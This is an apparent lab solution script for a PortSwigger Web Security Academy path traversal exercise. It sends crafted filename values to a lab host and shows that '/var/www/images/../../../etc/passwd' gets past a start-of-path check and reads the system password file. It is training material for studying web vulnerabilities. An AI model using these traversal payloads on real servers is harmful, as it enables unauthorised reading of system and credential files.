# Path traversal 11 of 14
# Lab: File path traversal, validation of start of path

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST = """
GET /image?filename=@@@PAYLOAD@@@ HTTP/2
Host: 0a7b008f03a529c180bb173f00e20086.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Referer: https://0a7b008f03a529c180bb173f00e20086.web-security-academy.net/
Cookie: session=vaNb00Wi5fxL1hCQ0j5udsobVHS4hz0a
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5, i
Pragma: no-cache
Cache-Control: no-cache
TE: trailers
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    # Original request
    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "/var/www/images/73.jpg")
    print('PLAIN CALL:', end='')
    await print_net_result(raw_req_0, False)

    # It fails (invalid start of path)
    raw_req_1 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "../../../etc/passwd")
    print('With invalid start of path:', end='')
    await print_net_result(raw_req_1, True)

    # It succeeds
    raw_req_2 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "/var/www/images/../../../etc/passwd")
    print('With valid start of path:', end='')
    await print_net_result(raw_req_2, True)

if __name__ == "__main__":
    asyncio.run(main())